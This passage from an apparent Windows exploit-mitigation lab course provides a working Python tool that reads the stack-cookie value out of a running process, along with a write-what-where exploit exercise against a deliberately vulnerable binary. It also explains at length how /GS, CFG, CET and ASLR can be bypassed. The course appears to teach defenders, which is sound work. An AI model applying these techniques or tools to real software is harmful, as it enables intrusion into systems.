   r rcx    # Target address being validated
   # Step through to see the bitmap check
   ```

5. **Verify CET independence**: All struct-based attacks succeed with CET enabled.
   CET protects `RET` instructions (backward edge), not indirect `CALL` (forward edge).
   The struct function pointer overwrite uses `CALL`, so CET is irrelevant.

#### Task 3: Cookie Analysis Tool

A functional tool that reads `__security_cookie` from a running process by
parsing the PE export directory and `.data` section. Requires the target
process to be compiled with debug symbols or the cookie offset found via
`dumpbin`.

```python
# cookie_analyzer.py
# Reads __security_cookie from a target Windows process.
#
# Usage:
#   python cookie_analyzer.py <pid> <cookie_rva>
#
# Find cookie_rva with:
#   dumpbin /symbols bin\realworld_server.exe | findstr __security_cookie
#   # Example: 00000000000A4560  __security_cookie
#   # RVA = 0xA4560
#
# Or in WinDbg:
#   x realworld_server!__security_cookie
#   # Subtract module base to get RVA

import ctypes
from ctypes import wintypes
import struct
import sys

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
psapi = ctypes.WinDLL('psapi', use_last_error=True)

# Process access rights
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400


def read_process_memory(handle, address, size):
    """Read 'size' bytes from 'address' in the target process."""
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t()
    ok = kernel32.ReadProcessMemory(
        handle,
        ctypes.c_void_p(address),
        buffer,
        size,
        ctypes.byref(bytes_read)
    )
    if not ok:
        err = ctypes.get_last_error()
        print(f"  [!] ReadProcessMemory failed at 0x{address:016X}: error {err}")
        return b""
    return buffer.raw[:bytes_read.value]


def get_module_base(handle):
    """
    Get the base address of the main module (the EXE) in the target process.
    Uses EnumProcessModulesEx — the first module is always the EXE itself.
    """
    hMods = (ctypes.c_void_p * 1024)()
    cbNeeded = wintypes.DWORD()
    ok = psapi.EnumProcessModulesEx(
        handle,
        ctypes.byref(hMods),
        ctypes.sizeof(hMods),
        ctypes.byref(cbNeeded),
        0x03  # LIST_MODULES_ALL
    )
    if not ok:
        print(f"  [!] EnumProcessModulesEx failed: {ctypes.get_last_error()}")
        return None

    # First module = main EXE
    base = hMods[0]
    if base is None or base == 0:
        return None

    # hMods[0] returns a Python int from c_void_p — use it directly for math,
    # but wrap in ctypes.c_void_p() when passing to API calls (large x64
    # addresses like 0x7FF6XXXXXXXX overflow if passed as plain int)
    mod_name = ctypes.create_string_buffer(260)
    psapi.GetModuleBaseNameA(handle, ctypes.c_void_p(base), mod_name, 260)

    print(f"  [*] Main module: {mod_name.value.decode()} @ 0x{base:016X}")
    return base


def analyze_cookie(pid, cookie_rva):
    """
    Read __security_cookie from a target process.

    The global __security_cookie is stored at a fixed RVA in the PE.
    It's initialized at process startup from entropy sources:
      - GetSystemTimeAsFileTime
      - GetCurrentProcessId / GetCurrentThreadId
      - QueryPerformanceCounter
      - Stack address

    On the stack, the cookie is XOR'd with RBP (x86) or RSP (x64)
    before being stored. The epilogue XORs again and compares with
    the global value. If they don't match -> __fastfail(2).
    """
    handle = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        False,
        pid
    )
    if not handle:
        print(f"[!] Failed to open PID {pid}: error {ctypes.get_last_error()}")
        print("    Ensure you have debug privileges (run as Administrator).")
        return

    print(f"[*] Opened PID {pid}")

    # Step 1: Find main module base address
    base = get_module_base(handle)
    if base is None:
        print("[!] Could not determine module base")
        kernel32.CloseHandle(handle)
        return

    # Step 2: Read __security_cookie at base + RVA
    cookie_addr = base + cookie_rva
    print(f"  [*] __security_cookie @ 0x{cookie_addr:016X} (base + 0x{cookie_rva:X})")

    data = read_process_memory(handle, cookie_addr, 8)
    if len(data) < 8:
        print("[!] Failed to read cookie value")
        kernel32.CloseHandle(handle)
        return

    cookie = struct.unpack('<Q', data)[0]
    print(f"  [+] __security_cookie = 0x{cookie:016X}")

    # Step 3: Analyze cookie properties
    print(f"\n[*] Cookie Analysis:")
    print(f"  Entropy bits: {bin(cookie).count('1')} of 64 set")

    # Check for weak/default cookies (should never appear in release)
    WEAK_COOKIES = [
        0x00002B992DDFA232,  # Default x64 cookie (uninitialized)
        0x0000BB40E64E6917,  # Another known default
        0x00000000BB40E64E,  # 32-bit default
    ]
    if cookie in WEAK_COOKIES:
        print(f"  [!] WARNING: Default/weak cookie detected!")
        print(f"      This means __security_init_cookie() may not have run.")
    else:
        print(f"  [*] Cookie appears properly randomized")

    # Check high 16 bits (should be non-zero for good entropy)
    if (cookie >> 48) == 0:
        print(f"  [!] WARNING: Upper 16 bits are zero — reduced entropy")
        print(f"      Expected full 64-bit entropy on x64 Windows 8+")
    else:
        print(f"  [*] Full 64-bit entropy present")

    # Step 4: Read .data section to find other interesting values nearby
    # The cookie is typically near the start of .data
    print(f"\n[*] Memory around cookie (±32 bytes):")
    context_data = read_process_memory(handle, cookie_addr - 32, 72)
    if context_data:
        for i in range(0, len(context_data), 8):
            offset = i - 32
            val = struct.unpack('<Q', context_data[i:i+8])[0]
            marker = " <-- __security_cookie" if offset == 0 else ""
            print(f"  [{offset:+4d}] 0x{val:016X}{marker}")

    kernel32.CloseHandle(handle)
    print(f"\n[*] Done. To see the stack-stored (XOR'd) cookie:")
    print(f"    Attach WinDbg -> bp on a /GS function -> examine [rsp+N]")
    print(f"    Stack cookie = global cookie XOR RSP (x64)")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python cookie_analyzer.py <pid> <cookie_rva_hex>")
        print("")
        print("Find cookie RVA:")
        print("  dumpbin /symbols bin\\target.exe | findstr __security_cookie")
        print("  # Take the hex address (e.g., 00000000000A4560 -> 0xA4560)")
        print("")
        print("Example:")
        print("  # Start target in one terminal:")
        print("  bin\\realworld_server.exe")
        print("  # Find PID:  tasklist | findstr realworld")
        print("  # Find RVA:  dumpbin /symbols bin\\realworld_server.exe | findstr __security_cookie")
        print("  python cookie_analyzer.py 1234 0xA4560")
        sys.exit(1)

    pid = int(sys.argv[1])
    cookie_rva = int(sys.argv[2], 16)
    analyze_cookie(pid, cookie_rva)
```

**Expected Output**:

```bash
c:\Windows_Mitigations_Lab> python cookie_analyzer.py 9968 0xA4560
#[*] Opened PID 9968
#  [*] Main module: realworld_server.exe @ 0x00007FF679980000
#  [*] __security_cookie @ 0x00007FF679A24560 (base + 0xA4560)
#  [+] __security_cookie = 0x00004336AA6DF55D
#
#[*] Cookie Analysis:
#  Entropy bits: 25 of 64 set
#  [*] Cookie appears properly randomized
#  [*] Full 64-bit entropy present
#
#[*] Memory around cookie (±32 bytes):
#  [ -32] 0x0000000000000000
#  [ -24] 0x0000000000000000
#  [ -16] 0x0000000000000001
#  [  -8] 0x00007FF679981000
#  [  +0] 0x00004336AA6DF55D <-- __security_cookie
#  [  +8] 0x0000000000000000
#  [ +16] 0x0000000000000000
#  [ +24] 0x0000000000000000
#  [ +32] 0x0000000000000000
#
#[*] Done. To see the stack-stored (XOR'd) cookie:
#    Attach WinDbg -> bp on a /GS function -> examine [rsp+N]
#    Stack cookie = global cookie XOR RSP (x64)
```

#### Task 4: Write-What-Where Lab — Global Function Pointer Attack

Demonstrate that `/GS` cookies are completely irrelevant when the vulnerability
is a Write-What-Where primitive (no stack corruption needed).

1. **Compile the www_vuln.c** (with `/GS` enabled — it won't help):

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\www_vuln.c ^
      /Fe:bin\www_vuln.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG
   ```

2. **Run the exploit** (addresses auto-parsed, no manual updates needed):

   ```bash
   python exploits\sc_www.py
   # Expected:
   #   [+] dangerous_action  = 0x0000000140001E33
   #   [+] cleanup_handler   @ 0x00000001400A4568 (address of global variable)
   #   [*] Payload (48 bytes):
   #   [*]   [36..39]  value: 0x40001E33 (low dword of dangerous_action)
   #   [*]   [40..47]  target: 0x00000001400A4568 (&cleanup_handler)
   #   [!] PWNED! Running dangerous action!
   #   [+] Clean exit (0x0) — cookie was never corrupted
   ```

3. **Verify cookie was untouched** — the exit code is `0x0` (clean), not `0xc0000409`.
   The `fread` reads exactly `sizeof(WriteRequest)` = 48 bytes into the struct.
   No bytes overflow past the struct into the stack cookie.

4. **Compare with stack-based attacks**: In Techniques 1-3, we corrupted function
   pointers that were struct members on the **stack**. Here, we use struct fields
   as **parameters** to an arbitrary write that targets a **global** function pointer.
   The stack cookie is simply never involved.

5. **Key insight**: `/GS` only detects corruption of the stack frame between the
   buffer and the return address. Writes to globals, heap, or other non-stack
   targets bypass `/GS` entirely. This is why defense-in-depth matters.

### Key Takeaways

1. **Stack cookies are bypassable through multiple vectors**: Information leaks (format string -> cookie recovery), struct-based function pointer overwrites (C standard §6.7.2.1 guarantees member order, `/GS` does NOT reorder struct internals), exception-based bypasses (cookie checked at `ret`, not at exception), and Write-What-Where primitives (target globals, never touch the cookie)
2. **`/GS` variable reordering has a critical blind spot**: While `/GS` moves arrays to higher stack addresses (next to the cookie), it cannot reorder **struct members** — the C standard requires preserved declaration order. Placing a buffer and function pointer in the same struct creates an exploitable layout that `/GS` cannot fix
3. **CET shadow stacks completely block return address hijacking**: Not "makes it harder" — **impossible**. The shadow stack is a hardware-protected copy of return addresses. Every `RET` compares both copies; mismatch -> `#CP` exception -> kernel kills the process via `__fastfail` -> exit code `0x80000003` (STATUS_BREAKPOINT). No user-mode recovery. This is why data-only and indirect `CALL` attacks are the modern approach
4. **CFG is coarse-grained — proven empirically**: MSVC CFG (`/guard:cf`) checks "is the target ANY valid function entry point?" — NOT "should THIS call site call THAT function." We proved this: redirecting `safe_handler` -> `dangerous_handler` passes CFG because `dangerous_handler` is a valid function. Only `dangerous_handler+4` (mid-function) is blocked with `0x80000003`. Fine-grained CFI (Clang `-fsanitize=cfi`) validates type signatures and would block this
5. **Data-only attacks bypass /GS + CET + coarse-grained CFG simultaneously**: Corrupting a security flag (`is_admin` in Technique 4), a function pointer in a struct (Techniques 1-3), or a global function pointer via Write-What-Where (Scenario 2) — none of these trigger any of the three mitigations
6. **Exception-based timing window**: `/GS` cookies are validated at function **return** (`__security_check_cookie` in the epilogue). If an exception fires between the overflow and the return, the `__except` handler reads already-corrupted data before the cookie is ever checked. On x64, this is NOT an SEH chain overwrite (impossible — table-based `.pdata`), but a data-corruption-before-check attack
7. **MSVCRT format strings differ from glibc in exploit-critical ways**:
   - `%p` prints bare hex (`000000000014FA48`) — no `0x` prefix
   - Positional `%N$x` is NOT supported — must use sequential `%p` and count offsets
   - `printf("%s", NULL)` prints `(null)` instead of crashing — cannot trigger exceptions this way
   - `_vsnprintf` buffer size limits how many values you can leak (512 bytes / 17 chars per `%p.` ≈ 30 values)
8. **ASLR interacts with all techniques**: With ASLR enabled (`/DYNAMICBASE`), leaked code pointers are 64KB-aligned-randomized. Partial overwrites (Technique 2) become harder because upper address bytes are randomized. Format string leaks are the primary ASLR defeat mechanism (leak -> calculate base -> build payload)
9. **Defense in depth is essential — no single mitigation is sufficient**:
   - `/GS` alone: bypassed by structs, exceptions, WWW, info leaks
   - CFG alone: bypassed by valid function redirects, data-only attacks
   - CET alone: bypassed by indirect CALL attacks, data-only attacks
   - ASLR alone: bypassed by info leaks (format strings, side channels)
   - All together: significantly raises the bar, but data-only attacks targeting application logic (not control flow) remain viable

### Discussion Questions

1. **Can you overflow past the stack cookie without corrupting it?**
   Yes — three proven methods from this lab:
   (a) Struct members: overflow within a struct corrupts the function pointer at a known offset but never reaches the cookie (Techniques 1-3).
   (b) Write-What-Where: use overflow to control struct fields that parameterize an arbitrary write to a global pointer (Scenario 2).
   (c) Exception window: corrupt data before the cookie is checked — the `__except` handler reads corrupted values mid-function (Technique 4).

2. **What happens if you leak the stack cookie value? Can CET still protect you?**
   Leaking the cookie lets you place the correct value in your overflow payload, surviving the `/GS` epilogue check. However, on CET-enabled systems, the return address is also validated against the shadow stack — the attacker cannot modify the shadow stack from user mode. So even with a leaked cookie, ROP/return address overwrites are blocked. The attacker must use data-only techniques (struct function pointers, global pointers, security flags) that don't involve `RET` hijacking.

3. **Why does CFG allow redirecting `safe_handler` -> `dangerous_handler`? What would block it?**
   CFG maintains a bitmap of valid function entry points. `dangerous_handler` IS a valid function entry, so CFG allows the call. CFG doesn't check "should this specific call site call this specific function" — it only checks "is the target a function entry at all." This is coarse-grained CFI. Fine-grained CFI (e.g., Clang's `-fsanitize=cfi`) would block this by verifying the function pointer's type signature matches the call site's expected signature. MSVC's XFG (eXtended Flow Guard) also adds type-based hashing but is not yet widely deployed.

4. **Why is SafeSEH only for 32-bit applications?**
   On x86, the SEH chain is stored on the stack — the attacker can overwrite exception handler pointers via buffer overflow. SafeSEH validates handlers against a table of known-good handlers. On x64, Windows uses table-based exception handling: `RUNTIME_FUNCTION` entries in the read-only `.pdata` PE section map instruction ranges to unwind info. The SEH chain doesn't exist on the stack, so there's nothing to overwrite. SafeSEH is unnecessary on x64 because the attack vector it protects against doesn't exist.

5. **If CET blocks return address overwrites, what attack classes remain viable?**
   Proven in this lab:
   - Struct-based function pointer corruption (indirect `CALL`, not `RET`) — Techniques 1-3
   - Data-only attacks (corrupt `is_admin`, config flags, file paths) — Technique 4
   - Write-What-Where to global function pointers — Scenario 2
   - JOP (Jump-Oriented Programming) — uses `JMP`, not `RET`
   - COP (Call-Oriented Programming) — uses `CALL`, not `RET`
   - Heap-based attacks (vtable overwrites via heap corruption) — not covered in depth here but CFG coarse-grained limitation applies

